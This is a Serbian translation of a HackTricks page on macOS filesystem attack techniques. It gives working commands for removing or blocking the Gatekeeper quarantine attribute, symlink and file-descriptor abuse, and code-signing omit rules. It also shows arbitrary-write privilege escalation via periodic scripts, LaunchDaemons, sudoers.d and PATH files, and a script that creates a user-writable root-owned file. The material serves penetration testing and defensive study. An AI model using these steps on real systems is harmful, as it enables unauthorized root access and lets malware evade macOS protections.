# macOS FS Trikovi

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Kombinacije POSIX dozvola

Dozvole u **direktorijumu**:

* **čitanje** - možete **izlistati** unose u direktorijumu
* **pisanje** - možete **brisati/pisati** **fajlove** u direktorijumu i možete **brisati prazne foldere**.
* Ali **ne možete obrisati/izmeniti neprazne foldere** osim ako imate dozvole za pisanje nad njima.
* Ne možete izmeniti ime foldera osim ako ga posedujete.
* **izvršavanje** - dozvoljeno vam je **traverzovati** direktorijum - ako nemate ovu dozvolu, ne možete pristupiti bilo kojim fajlovima unutra, ili u bilo kojim poddirektorijumima.

### Opasne Kombinacije

**Kako prebrisati fajl/folder koji je u vlasništvu root-a**, ali:

* Jedan roditeljski **direktorijum vlasnik** u putanji je korisnik
* Jedan roditeljski **direktorijum vlasnik** u putanji je **grupa korisnika** sa **pristupom pisanju**
* Grupa korisnika ima **pristup pisanju** fajlu

Sa bilo kojom od prethodnih kombinacija, napadač bi mogao **ubaciti** simbolički ili tvrdi **link** na očekivanu putanju kako bi dobio privilegovanu proizvoljnu izmenu.

### Poseban slučaj Folder root R+X

Ako postoje fajlovi u **direktorijumu** gde **samo root ima R+X pristup**, oni nisu **dostupni nikome drugom**. Dakle, ranjivost koja omogućava **pomeranje fajla koji je čitljiv za korisnika**, a koji ne može biti pročitan zbog te **restrikcije**, iz ovog foldera **u drugi**, može biti zloupotrebljena da bi se pročitali ti fajlovi.

Primer u: [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)

## Simbolički Link / Tvrdi Link

Ako privilegovani proces piše podatke u **fajl** koji bi mogao biti **kontrolisan** od strane **korisnika sa manje privilegija**, ili koji bi mogao biti **prethodno kreiran** od strane korisnika sa manje privilegija. Korisnik bi mogao samo **usmeriti** na drugi fajl putem Simboličkog ili Tvrdog linka, i privilegovani proces će pisati na taj fajl.

Proverite u drugim sekcijama gde napadač može **zloupotrebiti proizvoljno pisanje da bi eskalirao privilegije**.

## .fileloc

Fajlovi sa ekstenzijom **`.fileloc`** mogu pokazivati na druge aplikacije ili binarne fajlove tako da kada se otvore, aplikacija/binarni fajl će biti izvršen.\
Primer:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## Proizvoljni FD

Ako možete naterati **proces da otvori datoteku ili fasciklu sa visokim privilegijama**, možete zloupotrebiti **`crontab`** da otvori datoteku u `/etc/sudoers.d` sa **`EDITOR=exploit.py`**, tako da će `exploit.py` dobiti FD ka datoteci unutar `/etc/sudoers` i zloupotrebiti je.

Na primer: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)

## Izbegavajte trikove sa xattrs karantenom

### Uklonite je
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable zastava

Ako datoteka/folder ima ovaj nepromenljivi atribut, neće biti moguće staviti xattr na nju.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### Montiranje defvfs

**Devfs** montiranje **ne podržava xattr**, više informacija na [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### writeextattr ACL

Ova ACL sprečava dodavanje `xattrs` datoteci.
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** format datoteke kopira datoteku zajedno sa svojim ACE-ovima.

U [**izvornom kodu**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) moguće je videti da se ACL tekstualna reprezentacija čuva unutar xattr-a nazvanog **`com.apple.acl.text`** i da će biti postavljena kao ACL u dekompresovanoj datoteci. Dakle, ako ste kompresovali aplikaciju u zip datoteku sa **AppleDouble** formatom datoteke sa ACL-om koji sprečava pisanje drugih xattr-ova u nju... karantinski xattr nije postavljen u aplikaciju:

Proverite [**originalni izveštaj**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) za više informacija.

Da biste replicirali ovo, prvo morate dobiti tačan ACL string:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Napomena da čak i ako ovo radi, sandbox upisuje karantin xattr pre)

Nije baš potrebno, ali ostavljam to tamo, samo u slučaju:

{% content-ref url="macos-xattr-acls-extra-stuff.md" %}
[macos-xattr-acls-extra-stuff.md](macos-xattr-acls-extra-stuff.md)
{% endcontent-ref %}

## Zaobilaženje koda potpisa

Bundles sadrže datoteku **`_CodeSignature/CodeResources`** koja sadrži **hash** svake pojedinačne **datoteke** u **bundle**-u. Napomena da je hash CodeResources-a takođe **ugrađen u izvršnu datoteku**, tako da s tim ne možemo manipulisati.

Međutim, postoje neke datoteke čiji potpis neće biti proveren, one imaju ključ za izostavljanje u plist-u, kao što su:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Moguće je izračunati potpis resursa sa terminala pomoću: 

{% code overflow="wrap" %}
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Montiranje dmg datoteka

Korisnik može montirati prilagođenu dmg datoteku čak i preko nekih postojećih fascikli. Evo kako biste mogli kreirati prilagođeni dmg paket sa prilagođenim sadržajem:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
{% endcode %}

## Proizvoljni upisi

### Periodični sh skriptovi

Ako vaš skript može biti tumačen kao **shell skripta** možete prebrisati **`/etc/periodic/daily/999.local`** shell skript koji će biti pokrenut svakog dana.

Možete **falsifikovati** izvršenje ovog skripta sa: **`sudo periodic daily`**

### Demoni

Napišite proizvoljni **LaunchDaemon** poput **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** sa plist datotekom koja izvršava proizvoljnu skriptu poput:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
### Generisanje skripte `/Applications/Scripts/privesc.sh` sa **komandama** koje želite da pokrenete kao root.

### Datoteka Sudoers

Ako imate **proizvoljan upis**, možete kreirati datoteku unutar fascikle **`/etc/sudoers.d/`** koja vam dodeljuje **sudo** privilegije.

### Putanje datoteka

Datoteka **`/etc/paths`** je jedno od glavnih mesta koje popunjava PATH env varijablu. Morate biti root da biste je prepisali, ali ako skript iz **privilegovanog procesa** izvršava neku **komandu bez punog puta**, možda ćete moći da je **preuzmete** modifikujući ovu datoteku.

Takođe možete pisati datoteke u **`/etc/paths.d`** da učitate nove fascikle u `PATH` env varijablu.

## Generisanje datoteka sa dozvolom za upis drugih korisnika

Ovo će generisati datoteku koja pripada root-u, a koju mogu da pišem ja ([**kod odavde**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew\_lpe.sh)). Ovo takođe može raditi kao privesc:
```bash
DIRNAME=/usr/local/etc/periodic/daily

mkdir -p "$DIRNAME"
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit," "$DIRNAME"

MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDontDeleteStackLogFile=1 top invalidparametername

FILENAME=$(ls "$DIRNAME")
echo $FILENAME
```
## Reference

* [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
